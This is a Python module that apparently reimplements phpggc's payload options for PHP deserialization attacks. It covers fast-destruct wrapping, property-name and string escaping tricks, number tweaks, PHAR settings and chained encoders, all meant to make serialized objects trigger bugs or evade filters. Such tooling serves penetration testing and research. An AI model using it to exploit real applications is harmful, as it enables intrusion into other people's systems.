"""phpggc platform features: fast-destruct, encoders, string/property enhancements."""
from __future__ import annotations

import base64
import json
import re
from dataclasses import dataclass, field
from typing import Callable, Literal, Sequence

from .serialize import NUL

EncoderName = Literal["base64", "url", "soft", "json"]
PharFormat = Literal["phar", "zip", "tar"]


@dataclass
class GenerateOptions:
    """Mirrors phpggc CLI flags and parameters."""

    fast_destruct: bool = False
    public_properties: bool = False
    ascii_strings: bool = False
    armor_strings: bool = False
    plus_numbers: str = ""
    trailing_newline: bool = False
    phar: PharFormat | None = None
    phar_prefix: bytes = b""
    phar_filename: str = "test.txt"
    phar_jpeg: bytes | None = None
    phar_timestamp: int = 1
    encoders: Sequence[EncoderName] = field(default_factory=tuple)
    wrapper_hooks: dict[str, Callable] | None = None
    session_encode: bool = False
    fallback_phpggc: bool = True
    phpggc_path: str | None = None
    phpggc_dir: str | None = None
    wrapper_path: str | None = None

    def validate(self) -> None:
        if self.ascii_strings and self.armor_strings:
            raise ValueError("ascii-strings and armor-strings are mutually exclusive")


FAST_DESTRUCT_TEMP_KEY = 7896543210
FAST_DESTRUCT_FINAL_KEY = 7


def wrap_fast_destruct(obj: str) -> str:
    """Pre-process: temp-key array (matches phpggc FastDestruct::process_object)."""
    key = FAST_DESTRUCT_TEMP_KEY
    return f"a:2:{{i:{key};{obj}i:{key + 1};i:{key};}}"


def finalize_fast_destruct(serialized: str) -> str:
    """Post-process: replace temp keys with final key 7."""
    pattern = re.compile(
        rf"i:({FAST_DESTRUCT_TEMP_KEY}|{FAST_DESTRUCT_TEMP_KEY + 1});"
    )
    return pattern.sub(f"i:{FAST_DESTRUCT_FINAL_KEY};", serialized)


def apply_public_properties(serialized: str) -> str:
    def _remove_prefix(match: re.Match[str]) -> str:
        length = int(match.group(1))
        prefix = match.group(2)
        reduction = len(prefix) + 2
        return f's:{length - reduction}:"'

    return re.sub(
        r'\bs:(\d+):"\x00([\w\\]+|\*)\x00',
        _remove_prefix,
        serialized,
    )


def apply_plus_numbers(serialized: str, types: str) -> str:
    if not types:
        return serialized
    escaped = re.escape(types)
    return re.sub(
        rf"\b([{escaped}]):(\d+)([:;])",
        r"\1:+\2\3",
        serialized,
    )


def apply_ascii_strings(serialized: str, *, full: bool = False) -> str:
    pattern = re.compile(r'\bs:([0-9]+):"')
    new = ""
    last = 0
    current = 0
    while current < len(serialized):
        match = pattern.search(serialized, current)
        if not match:
            break
        p_start = match.start()
        p_start_string = match.end()
        length = int(match.group(1))
        p_end_string = p_start_string + length
        if not (
            len(serialized) > p_end_string + 2
            and serialized[p_end_string : p_end_string + 2] == '";'
        ):
            current = p_start_string
            continue
        string = serialized[p_start_string:p_end_string]
        clean = ""
        for ch in string:
            if full or (not ch.isprintable()) or ch == "\\":
                clean += f"\\{ord(ch):02x}"
            else:
                clean += ch
        new += serialized[last:p_start] + f'S:{length}:"{clean}";'
        last = p_end_string + 2
        current = last
    new += serialized[last:]
    return new


def apply_encoders(data: bytes, encoders: Sequence[EncoderName]) -> bytes | str:
    out: bytes | str = data
    for enc in encoders:
        if enc == "base64":
            out = base64.b64encode(out if isinstance(out, bytes) else out.encode("latin-1"))
        elif enc == "url":
            from urllib.parse import quote

            raw = out if isinstance(out, bytes) else out.encode("latin-1")
            out = quote(raw, safe="")
        elif enc == "soft":
            raw = out.decode("latin-1") if isinstance(out, bytes) else out
            keys = list("%\x00\n\r\t+; ")
            for k in keys:
                from urllib.parse import quote

                raw = raw.replace(k, quote(k, safe=""))
            out = raw
        elif enc == "json":
            raw = out.decode("latin-1") if isinstance(out, bytes) else out
            out = json.dumps(raw)
    return out


def apply_platform(serialized: str, opts: GenerateOptions) -> bytes:
    opts.validate()
    data = serialized
    if opts.wrapper_hooks and "process_serialized" in opts.wrapper_hooks:
        data = opts.wrapper_hooks["process_serialized"](data)
    if opts.public_properties:
        data = apply_public_properties(data)
    if opts.ascii_strings:
        data = apply_ascii_strings(data, full=False)
    if opts.armor_strings:
        data = apply_ascii_strings(data, full=True)
    if opts.plus_numbers:
        data = apply_plus_numbers(data, opts.plus_numbers)
    if opts.session_encode:
        from .bridge import session_encode_via_php

        return session_encode_via_php(data, phpggc_path=opts.phpggc_path)
    out = data.encode("latin-1")
    if opts.encoders:
        encoded = apply_encoders(out, opts.encoders)
        if isinstance(encoded, str):
            return encoded.encode("latin-1")
        return encoded
    return out


def maybe_wrap(obj: str, fast_destruct: bool) -> bytes:
    if fast_destruct:
        return finalize_fast_destruct(wrap_fast_destruct(obj)).encode("latin-1")
    return obj.encode("latin-1")
